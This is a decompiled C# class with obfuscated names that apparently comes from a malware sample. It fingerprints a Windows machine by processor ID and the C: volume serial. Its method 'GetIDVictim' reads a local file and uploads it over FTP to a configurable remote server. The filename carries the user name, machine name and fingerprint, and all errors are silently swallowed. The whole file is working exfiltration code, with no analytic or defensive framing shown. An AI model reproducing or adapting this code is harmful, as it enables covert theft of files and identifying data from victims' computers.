using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;

namespace MufMaOSvGyvz
{
	// Token: 0x02000012 RID: 18
	internal sealed class ID
	{
		// Token: 0x06000052 RID: 82
		public static string ID()
		{
			string str = string.Empty;
			ManagementClass managementClass = new ManagementClass("win32_processor");
			ManagementObjectCollection instances = managementClass.GetInstances();
			using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = instances.GetEnumerator())
			{
				if (enumerator.MoveNext())
				{
					ManagementObject managementObject = (ManagementObject)enumerator.Current;
					str = managementObject.Properties["processorID"].Value.ToString();
				}
			}
			string str2 = "C";
			ManagementObject managementObject2 = new ManagementObject("win32_logicaldisk.deviceid=\"" + str2 + ":\"");
			managementObject2.Get();
			string str3 = managementObject2["VolumeSerialNumber"].ToString();
			return str3 + str;
		}

		// Token: 0x06000053 RID: 83
		public static void GenerateIDMain(string AYGEFRLByvvc = "URL", string bWHhiqLjYJjlJ = "USERNAME", string YOjlHhEIoQa = "ACCESO", string KYfRRhHmvJaq = "")
		{
			try
			{
				string text = MufMaOSvGyvz.ID.ID();
				FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(string.Concat(new string[]
				{
					AYGEFRLByvvc,
					"UserName=",
					Environment.UserName,
					"_MachineName=",
					Environment.MachineName,
					"_",
					text,
					".txt"
				}));
				ftpWebRequest.Method = "STOR";
				ftpWebRequest.Credentials = new NetworkCredential(bWHhiqLjYJjlJ, YOjlHhEIoQa);
				ASCIIEncoding asciiencoding = new ASCIIEncoding();
				byte[] bytes = asciiencoding.GetBytes(KYfRRhHmvJaq);
				ftpWebRequest.ContentLength = (long)bytes.Length;
				using (Stream requestStream = ftpWebRequest.GetRequestStream())
				{
					requestStream.Write(bytes, 0, bytes.Length);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000054 RID: 84
		public static void GetIDVictim(string zxXgUOQaPMcjTwJ = "URL", string shCgxQKbpDrjP = "USERNAME", string BgGKwsKTzpt = "ACCESO", string LrnCoaPZsGSyiOc = "")
		{
			try
			{
				string text = MufMaOSvGyvz.ID.ID();
				FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(string.Concat(new string[]
				{
					zxXgUOQaPMcjTwJ,
					"UserName=",
					Environment.UserName,
					"_MachineName=",
					Environment.MachineName,
					"_",
					text,
					".txt"
				}));
				ftpWebRequest.Method = "STOR";
				ftpWebRequest.Credentials = new NetworkCredential(shCgxQKbpDrjP, BgGKwsKTzpt);
				byte[] bytes;
				using (StreamReader streamReader = new StreamReader(LrnCoaPZsGSyiOc))
				{
					bytes = Encoding.UTF8.GetBytes(streamReader.ReadToEnd());
				}
				ftpWebRequest.ContentLength = (long)bytes.Length;
				using (Stream requestStream = ftpWebRequest.GetRequestStream())
				{
					requestStream.Write(bytes, 0, bytes.Length);
				}
			}
			catch
			{
			}
		}
	}
}
